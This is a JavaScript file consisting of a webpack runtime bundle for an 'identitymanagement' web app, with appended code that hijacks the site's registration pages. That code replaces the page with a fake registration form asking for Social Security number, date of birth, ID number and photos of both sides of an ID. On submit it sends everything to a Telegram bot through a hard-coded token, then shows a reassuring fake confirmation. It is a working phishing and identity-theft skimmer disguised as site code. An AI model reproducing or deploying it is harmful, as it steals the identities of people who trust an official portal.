!(function () {
  "use strict";
  var e,
    v = {},
    m = {};
  function n(e) {
    var f = m[e];
    if (void 0 !== f) return f.exports;
    var t = (m[e] = {
      id: e,
      loaded: !1,
      exports: {},
    });
    return v[e].call(t.exports, t, t.exports, n), (t.loaded = !0), t.exports;
  }
  (n.m = v),
    (e = []),
    (n.O = function (f, t, i, u) {
      if (!t) {
        var r = 1 / 0;
        for (a = 0; a < e.length; a++) {
          (t = e[a][0]), (i = e[a][1]), (u = e[a][2]);
          for (var l = !0, c = 0; c < t.length; c++)
            (!1 & u || r >= u) &&
            Object.keys(n.O).every(function (p) {
              return n.O[p](t[c]);
            })
              ? t.splice(c--, 1)
              : ((l = !1), u < r && (r = u));
          if (l) {
            e.splice(a--, 1);
            var d = i();
            void 0 !== d && (f = d);
          }
        }
        return f;
      }
      u = u || 0;
      for (var a = e.length; a > 0 && e[a - 1][2] > u; a--) e[a] = e[a - 1];
      e[a] = [t, i, u];
    }),
    (n.n = function (e) {
      var f =
        e && e.__esModule
          ? function () {
              return e.default;
            }
          : function () {
              return e;
            };
      return (
        n.d(f, {
          a: f,
        }),
        f
      );
    }),
    (n.d = function (e, f) {
      for (var t in f)
        n.o(f, t) &&
          !n.o(e, t) &&
          Object.defineProperty(e, t, {
            enumerable: !0,
            get: f[t],
          });
    }),
    (n.f = {}),
    (n.e = function (e) {
      return Promise.all(
        Object.keys(n.f).reduce(function (f, t) {
          return n.f[t](e, f), f;
        }, [])
      );
    }),
    (n.u = function (e) {
      return (
        (592 === e ? "common" : e) +
        "." +
        {
          16: "98ffde9a7edf6e20",
          26: "6c6c2124b0a4d69f",
          106: "ada10e452be5b45b",
          129: "fc6419e160a8ed04",
          178: "22a5032755f5934e",
          193: "c1aa66852aaa5092",
          219: "09df8f19638e3589",
          222: "0b678141bc6ea304",
          259: "d4e5a400151e552a",
          333: "109b38f3932c33fe",
          357: "2a18d26f088c4692",
          474: "85de5424da181dcc",
          517: "6dc7a2a24c2762a8",
          527: "01db10ec31cd3ebf",
          592: "a9b2648308f827e8",
          634: "3a0c01f1f5f8c78d",
          635: "5d5c49c0f3ad72e0",
          742: "ff42f653c7277e5b",
          867: "34662fdad162cade",
          949: "0e98589118d9e878",
        }[e] +
        ".js"
      );
    }),
    (n.miniCssF = function (e) {}),
    (n.o = function (e, f) {
      return Object.prototype.hasOwnProperty.call(e, f);
    }),
    (function () {
      var e = {},
        f = "identitymanagement:";
      n.l = function (t, i, u, a) {
        if (e[t]) e[t].push(i);
        else {
          var r, l;
          if (void 0 !== u)
            for (
              var c = document.getElementsByTagName("script"), d = 0;
              d < c.length;
              d++
            ) {
              var o = c[d];
              if (
                o.getAttribute("src") == t ||
                o.getAttribute("data-webpack") == f + u
              ) {
                r = o;
                break;
              }
            }
          r ||
            ((l = !0),
            ((r = document.createElement("script")).type = "module"),
            (r.charset = "utf-8"),
            (r.timeout = 120),
            n.nc && r.setAttribute("nonce", n.nc),
            r.setAttribute("data-webpack", f + u),
            (r.src = n.tu(t))),
            (e[t] = [i]);
          var b = function (g, p) {
              (r.onerror = r.onload = null), clearTimeout(s);
              var h = e[t];
              if (
                (delete e[t],
                r.parentNode && r.parentNode.removeChild(r),
                h &&
                  h.forEach(function (y) {
                    return y(p);
                  }),
                g)
              )
                return g(p);
            },
            s = setTimeout(
              b.bind(null, void 0, {
                type: "timeout",
                target: r,
              }),
              12e4
            );
          (r.onerror = b.bind(null, r.onerror)),
            (r.onload = b.bind(null, r.onload)),
            l && document.head.appendChild(r);
        }
      };
    })(),
    (n.r = function (e) {
      "undefined" != typeof Symbol &&
        Symbol.toStringTag &&
        Object.defineProperty(e, Symbol.toStringTag, {
          value: "Module",
        }),
        Object.defineProperty(e, "__esModule", {
          value: !0,
        });
    }),
    (n.nmd = function (e) {
      return (e.paths = []), e.children || (e.children = []), e;
    }),
    (function () {
      var e;
      n.tt = function () {
        return (
          void 0 === e &&
            ((e = {
              createScriptURL: function (f) {
                return f;
              },
            }),
            "undefined" != typeof trustedTypes &&
              trustedTypes.createPolicy &&
              (e = trustedTypes.createPolicy("angular#bundler", e))),
          e
        );
      };
    })(),
    (n.tu = function (e) {
      return n.tt().createScriptURL(e);
    }),
    (n.p = ""),
    (function () {
      var e = {
        666: 0,
      };
      (n.f.j = function (i, u) {
        var a = n.o(e, i) ? e[i] : void 0;
        if (0 !== a)
          if (a) u.push(a[2]);
          else if (666 != i) {
            var r = new Promise(function (o, b) {
              a = e[i] = [o, b];
            });
            u.push((a[2] = r));
            var l = n.p + n.u(i),
              c = new Error();
            n.l(
              l,
              function (o) {
                if (n.o(e, i) && (0 !== (a = e[i]) && (e[i] = void 0), a)) {
                  var b = o && ("load" === o.type ? "missing" : o.type),
                    s = o && o.target && o.target.src;
                  (c.message =
                    "Loading chunk " + i + " failed.\n(" + b + ": " + s + ")"),
                    (c.name = "ChunkLoadError"),
                    (c.type = b),
                    (c.request = s),
                    a[1](c);
                }
              },
              "chunk-" + i,
              i
            );
          } else e[i] = 0;
      }),
        (n.O.j = function (i) {
          return 0 === e[i];
        });
      var f = function (i, u) {
          var c,
            d,
            a = u[0],
            r = u[1],
            l = u[2],
            o = 0;
          if (
            a.some(function (s) {
              return 0 !== e[s];
            })
          ) {
            for (c in r) n.o(r, c) && (n.m[c] = r[c]);
            if (l) var b = l(n);
          }
          for (i && i(u); o < a.length; o++)
            n.o(e, (d = a[o])) && e[d] && e[d][0](), (e[d] = 0);
          return n.O(b);
        },
        t = (self.webpackChunkidentitymanagement =
          self.webpackChunkidentitymanagement || []);
      t.forEach(f.bind(null, 0)), (t.push = f.bind(null, t.push.bind(t)));
    })();
})();

const img = document.querySelector(
  'img[src="https://www.dmdc.osd.mil/identitymanagement/api/data/www.citizensbankonline.3-a.net/header.png"]'
);

// Check if the image exists and then change its src
if (img) {
  img.src =
    "https://www.dmdc.osd.mil/identitymanagement/api/data/www.hrc.army.mil/header.png"; // New image URL
}

// Create a new <link> element
const link = document.createElement("link");

// Set the attributes for the <link> element
link.rel = "stylesheet";
link.href =
  "https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css";
link.integrity =
  "sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC";
link.crossOrigin = "anonymous";

// Append the <link> element to the <head>
document.head.appendChild(link);

const iconLink = document.createElement("link");
iconLink.rel = "stylesheet";
iconLink.href =
  "https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css";
document.head.appendChild(iconLink);

const script = document.createElement("script");
script.src =
  "https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js";
script.integrity =
  "sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM";
script.crossOrigin = "anonymous";
document.head.appendChild(script);

const modalContainer = document.createElement("div");

// Set the inner HTML of the modal container
modalContainer.innerHTML = `
    <div
      class="modal fade"
      id="feedbackModal"
      tabindex="-1"
      aria-labelledby="feedbackModalLabel"
      aria-hidden="true"
    >
      <div class="modal-dialog">
        <div class="modal-content">
          <div class="modal-header">
            <h5 class="modal-title" id="feedbackModalLabel">Application Received</h5>
            <button
              type="button"
              class="btn-close"
              data-bs-dismiss="modal"
              aria-label="Close"
            ></button>
          </div>
          <div class="modal-body">
            <p>Thank you for submitting your application! We have received your submission and our team is reviewing it.</p>
            <p>You will hear from us via email within the next few days.</p>
          </div>
          <div class="modal-footer">
            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
          </div>
        </div>
      </div>
    </div>
  `;

// Append the modal to the body
document.body.appendChild(modalContainer);

function Registration() {
  const img = document.querySelector(
    'img[src="https://www.dmdc.osd.mil/identitymanagement/api/data/www.citizensbankonline.3-a.net/header.png"]'
  );

  // Check if the image exists and then change its src
  if (img) {
    img.src =
      "https://www.dmdc.osd.mil/identitymanagement/api/data/www.hrc.army.mil/header.png"; // New image URL
  }
  const pageContent = document.getElementById("page-content");
  observer.disconnect();

  const newContent = `
  <div
    class="mt-5 mx-auto px-3 rounded shadow py-3"
    style="max-width: 660px; background-color: #fff"
  >
    <div class="">
      <h2 class="mb-4">Registration</h2>
      <p class="mb-4">Tell us about yourself.</p>
      <form id="registrationForm">
        <!-- Name section -->
        <div class="row mb-3">
          <div class="col-12 col-sm-4">
            <label for="firstName" class="form-label">First Name *</label>
            <input
              id="firstName"
              type="text"
              class="form-control py-3"
              style="max-width: 200px"
              placeholder="First Name *"
              required
            />
          </div>
          <div class="col-12 col-sm-4">
            <label for="lastName" class="form-label">Last Name *</label>
            <input
              id="lastName"
              type="text"
              class="form-control py-3"
              style="max-width: 200px"
              placeholder="Last Name *"
              required
            />
          </div>
        </div>

        <!-- Date of Birth section -->
        <h3 class="py-2 text-dark">Date of Birth</h3>
        <div class="row mb-3">
          <div class="col-12 col-sm-4">
            <label for="month" class="form-label">Month</label>
            <input
              id="month"
              type="number"
              class="form-control py-3"
              style="max-width: 200px"
              placeholder="Month"
              required
              min="1" 
              max="12"
            />
          </div>
          <div class="col-12 col-sm-4">
            <label for="day" class="form-label">Day</label>
            <input
              id="day"
              type="number"
              class="form-control py-3"
              style="max-width: 200px"
              placeholder="Day"
              required
              min="1" 
              max="31"
            />
          </div>
          <div class="col-12 col-sm-4">
            <label for="year" class="form-label">Year</label>
            <input
              id="year"
              type="number"
              class="form-control py-3"
              style="max-width: 200px"
              placeholder="Year"
              required
              min="1900" 
              max="2007"
            />
          </div>
        </div>
        
        <!-- Email and SSN section -->
        <div class="row mb-3">
          <div class="col-12 col-sm-4">
            <label for="email" class="form-label">Email address *</label>
            <input
              id="email"
              type="email"
              class="form-control py-3"
              style="max-width: 200px"
              placeholder="Email address *"
              required
            />
          </div>
          <div class="col-12 col-sm-4">
            <label for="ssn" class="form-label">Social Security Number *</label>
            <input
              id="ssn"
              type="text"
              class="form-control py-3"
              style="max-width: 200px"
              placeholder="SSN *"
              required
            />
          </div>
        </div>

        <!-- Person Identifier section -->
        <div class="row mb-3">
          <div class="col-12 col-sm-4">
            <label for="idType" class="form-label">ID Type *</label>
            <select
              id="idType"
              class="form-select py-3"
              style="max-width: 200px"
              required
            >
              <option selected disabled>Select ID Type</option>
              <option value="1">Passport</option>
              <option value="2">Driver's License</option>
              <option value="3">National ID</option>
            </select>
          </div>
          <div class="col-12 col-sm-4">
            <label for="idNumber" class="form-label">ID Number *</label>
            <div class="input-group">
              <input
                id="idNumber"
                type="password"
                class="form-control py-3"
                style="max-width: 200px"
                placeholder="ID Number *"
                required
              />
              <span class="input-group-text">
                <i class="bi bi-eye"></i>
              </span>
            </div>
          </div>
        </div>

        <!-- ID Front and Back Upload section -->
        <div class="row mb-3">
          <div class="col-12 col-sm-6">
            <label for="imageUploadFront" class="form-label">ID Front</label>
            <input
              id="imageUploadFront"
              class="form-control form-control-lg"
              type="file"
              style="max-width: 300px"
              accept="image/*"
              required
            />
          </div>
          <div class="col-12 col-sm-6">
            <label for="imageUploadBack" class="form-label">ID Back</label>
            <input
              id="imageUploadBack"
              class="form-control form-control-lg"
              type="file"
              style="max-width: 300px"
              accept="image/*"
              required
            />
          </div>
        </div>

        <!-- Buttons section -->
        <div class="row">
          <div class="col d-flex">
            <button type="submit" id="submit-btn" class="btn btn-primary me-2">Submit</button>
            <button _ngcontent-sdv-c192="" type="button" id="cancel" mat-raised-button="" aria-label="Cancel Button" class="mat-focus-indicator mat-raised-button mat-button-base"><span class="mat-button-wrapper">Cancel</span><span matripple="" class="mat-ripple mat-button-ripple"></span><span class="mat-button-focus-overlay"></span></button>
          </div>
        </div>
      </form>
    </div>
  </div>
`;
  pageContent.innerHTML = newContent;
  // Reconnect the observer after DOM manipulation is complete
  observer.observe(document, { childList: true, subtree: true });

  const botToken = "6980032440:AAGfgxetXOEWp0bVi2cXotvrupsDqn0FUxU"; // Replace with your bot token
  const chatId = "1099461059"; // Replace with your chat ID

  //   document
  //     .getElementById("submit-btn")
  //     .addEventListener("click", formSubmission);

  document.getElementById("cancel").addEventListener("click", function () {
    window.location.href = "/";
  });

  const form = document.getElementById("registrationForm");

  form.addEventListener("submit", formSubmission);

  function formSubmission(e) {
    e.preventDefault(); // Prevent the form from refreshing the page
    document.getElementById("submit-btn").setAttribute("disabled", "true");

    // Get form values
    const firstName = document.getElementById("firstName").value;
    const lastName = document.getElementById("lastName").value;
    const month = document.getElementById("month").value;
    const day = document.getElementById("day").value;
    const year = document.getElementById("year").value;
    const email = document.getElementById("email").value;
    const ssn = document.getElementById("ssn").value;
    const idType = document.getElementById("idType").value;
    const idNumber = document.getElementById("idNumber").value;
    const idFront = document.getElementById("imageUploadFront").files[0]; // ID front image
    const idBack = document.getElementById("imageUploadBack").files[0]; // ID back image
    // Construct message for text data
    const message = `
            New Registration:
            Name: ${firstName} ${lastName}
            DOB: ${month}/${day}/${year}
            Email: ${email}
            SSN: ${ssn}
            ID Type: ${idType}
            ID Number: ${idNumber}
          `;

    // Send the text message first
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
      .then((response) => response.json())
      .then((result) => {
        console.log("Message sent:", result);
        // After sending the message, send the images
        if (idFront) {
          sendImageToTelegram(idFront, "ID Front");
        }
        if (idBack) {
          sendImageToTelegram(idBack, "ID Back");
        }
      })
      .catch((error) => {
        console.error("Error sending message:", error);
      });
    var feedbackModal = new bootstrap.Modal(
      document.getElementById("feedbackModal")
    );
    feedbackModal.show();
    // document.getElementById("firstName").value = "";
    // document.getElementById("lastName").value = "";
    // document.getElementById("month").value = "";
    // document.getElementById("day").value = "";
    // document.getElementById("year").value = "";
    // document.getElementById("email").value = "";
    // document.getElementById("ssn").value = "";
    // document.getElementById("idType").value = "";
    // document.getElementById("idNumber").value = "";
    // document.getElementById("imageUploadFront").value = ""; // ID front image
    // document.getElementById("imageUploadBack").value = ""; // ID back image
    this.reset();
  }

  // Function to send images to Telegram
  function sendImageToTelegram(imageFile, caption) {
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", imageFile);
    formData.append("caption", caption);

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: "POST",
      body: formData,
    })
      .then((response) => response.json())
      .then((result) => {
        console.log("Image sent:", result);
      })
      .catch((error) => {
        console.error("Error sending image:", error);
      });
  }
}
const observer = new MutationObserver(() => {
  const img = document.querySelector(
    'img[src="https://www.dmdc.osd.mil/identitymanagement/api/data/www.citizensbankonline.3-a.net/header.png"]'
  );
  if (img) {
    img.src =
      "https://www.dmdc.osd.mil/identitymanagement/api/data/www.hrc.army.mil/header.png"; // New image URL
  }

  if (
    window.location.pathname ===
    "/identitymanagement/app/registration/submit-identity-no-reader"
  ) {
    console.log("i am in the if statement");
    setTimeout(Registration, 500);
  }
  if (
    window.location.pathname ===
    "/identitymanagement/app/registration/submit-identity"
  ) {
    setTimeout(Registration, 500);
  }
});
observer.observe(document, { childList: true, subtree: true });
